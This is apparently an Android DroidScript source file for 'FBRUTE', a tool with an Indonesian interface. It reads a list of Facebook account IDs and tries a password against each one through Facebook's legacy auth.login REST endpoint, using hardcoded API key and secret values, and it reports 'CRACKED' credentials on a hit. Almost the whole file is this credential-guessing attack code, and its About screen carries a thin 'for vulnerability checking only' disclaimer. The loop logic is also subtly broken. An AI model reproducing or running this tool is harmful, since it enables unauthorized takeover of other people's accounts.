    	function OnStart(){
    	app.EnableBackKey( false);
    	app.SetOrientation("Portrait" );
    	app.LoadScript("md5.js");
    	app.WriteFile	("/sdcard/Fbrute","T25lCg==");
    	lay = app.CreateLayout("linear","VCenter,FillXY");
    	lay.SetBackColor( "black" );
    	lay.SetBackground( "Img/FB_IMG_15680095567007967.jpg" );
    	lay.AddChild( Img );
    	
    	idlist = app.CreateTextEdit	("",.8,-1,"SingleLine,Monospace");
    	idlist.SetHint("Lokasi ID");
    	
    	idlist.SetTextColor("Green");
    	idlist.SetTextSize("19");
    	idlist.SetMargins(0,.1,0,0);
    	lay.AddChild(idlist);
    	
    	password = app.CreateTextEdit	("",.8,-1,"SingleLine,Monospace");
    	password.SetMargins(0,.01,0,0);
    	password.SetHint("Password");
    	password.SetTextColor("Green");
    	password.SetTextSize("19");
    	lay.AddChild(password);
    	crack = app.CreateButton	("Start Attack",.6,.1,"alum");
    	crack.SetMargins(0,.01,0,0);
    	crack.SetFontFile("font.ttf");
    	crack.SetTextColor("green");
    	crack.SetTextSize("22");
    	crack.SetOnTouch(crack_OnTouch);
    	lay.AddChild(crack);
    	about = app.CreateButton("About",.6,.1,"alum");
    	about.SetTextColor( "green" );
    	about.SetFontFile("font.ttf");
    about.SetOnTouch(about_OnTouch);
    lay.AddChild(about);
    
    Developer =app.CreateText( "Create By Mr.12-cb",0.9,0.1, "Multiline");
    Developer.SetTextColor( "Green" );
    lay.AddChild( Developer);

    lay2 = app.CreateLayout("linear","VCenter,FillXY");
    lay2.SetVisibility("hide");
    tscroll = app.CreateScroller( 1,1 );
    tscroll.SetBackColor("black");
    lay2.AddChild(tscroll);
    log = app.CreateText("",1.1,-1,"Log,Monospace");
    log.SetFontFile("font.ttf");
    log.SetBackColor("black");
    log.SetLog(1e3);
    log.SetTextSize("16");
    log.SetTextColor("green");
    tscroll.AddChild(log);
   app.AddLayout( lay );
   app.AddLayout( lay2 );
       }
    	function crack_OnTouch(){
    	var e=idlist.GetText();
    	t=password.GetText();
    		if(e.length!=0&&t.length>=8)
    		if(app.alert(e)!=0){
    		app.WriteFile("/sdcard/Fbrute","VHdvCg==");
    		lay2.Animate("SlideFromBottom");
    			try{
    			app.HideKeyboard(  );
    			id = app.ReadFile	(e).split("\n");
    			for(x=0;	x<id.length;x++)printf("[*] Trying id "+id[x]+" ("+(x+1)+"-"+id.length+")");
    			API_SECRET="62f8ce9f74b12f84c123cc23437a4a32";
    			sig="api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail="+id[x]+"format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword="+t+"return_ssl_resources=0v=1.0"+API_SECRET;
    			xx=CryptoJS.MD5(sig);
    			data="api_key=882a8490361da98702bf97a021ddc14d&credentials_type=password&email="+id[x]+"&format=JSON&generate_machine_id=1&generate_session_cookies=1&locale=en_US&method=auth.login&password="+t+"&return_ssl_resources=0&v=1.0&sig="+xx;
    			request=new XMLHttpRequest;
    			request.open("GET","https://api.facebook.com/restserver.php?"+data,!1);
    			request.send();
    			err=[];
    			dat=JSON.parse(request.response);
    			dat["error_msg"]!=undefined?void 0:(app.Vibrate("0,500"),printf("======== CRACKED ========="),printf("[+] FB USER : "+id[x]),printf("[+] FB PASS : "+t),printf("=========================="));
    			printf("[~] Done.");
    		}
    			catch(n){
    			alert("NetworkError: network is unreachable");
    			Scroll();
    		}
    	}
    	else alert(e+": No such file or directory");
    	else e.length!=0&&t.length==0?alert("PASSWORD BELUM DI ISI"):e.length==0&&t.length==0?alert("PASSWORD BELUM DI ISI!!\nTULIS LOKASI LIST ID !!!"):e.length!=0&&t.length<6?alert("Password terlalu pendek"):alert("MASUKAN LOKASI LIST ID!!!")
    }
    	function about_OnTouch(){
    	 lay = app.EnableBackKey( false );
    lay = app.CreateLayout( "linear", "VCenter,FillXY" );
   
    lay.SetBackColor( "black" );

    //Button with image in between chars.
    var text = "<big><b>FBRUTE</b></big>"+
    "<br> tool ini dibuat hanya untuk cek kerentanan </br>"+
    "<br> bukan untuk kegiatan HACKING </br>"+
    "<br> apabila disalah gunakan kami tidak bertanggung jawab  </br>"+
    "++++++++++=========++++++++++"+
    "<b><br><big>INGAT!!!!!!!!</b></br></big>"+
    "<br>siapa yg suka hack suatusaat pasti akan ter hack</br>";
    btn = app.CreateButton( text, 1, 1, "Html" );
    btn.SetTextSize( 20 );
    btn.SetPadding( 0.03, 0.02, 0.03, 0.02 );
    btn.SetMargins( 0, 0.03, 0, 0 );
    btn.SetTextColor( "green" );
    
    lay.AddChild( btn );
    app.AddLayout(  lay ); 
     }
    	function OnBack(e){
    	app.ReadFile	("/sdcard/Fbrute")=="T25lCg=="?(dlg=app.CreateYesNoDialog("YAKIN MAU KELUAR?"),dlg.SetOnTouch(dlg_OnTouch),dlg.Show()):
    	app.ReadFile("/sdcard/Fbrute")=="VHdvCg=="?(app.writeFile("/sdcard/Fbrute","T25lCg=="),lay2.Animate("SlideToBottom")):(dlg=app.CreateYesNoDialog("YAKIN MAU KELUAR?"),dlg.SetOnTouch(dlg_OnTouch),dlg.Show())
    }
    	function printf(e){
    	log.Log(e,"Monospace"),Scroll()
    }
    	function Scroll(){
    	tscroll.ScrollTo(0,999)
    }
    	function dlg_OnTouch(e){
    	e=="Yes"?app.Exit():dlg.Dismiss()
    }
    	function sleep(e){
    	var t=(new Date).getTime();
    	for(var n=0;
    	n<1e7;
    	n++)if((new Date).getTime()-t>e)break
    }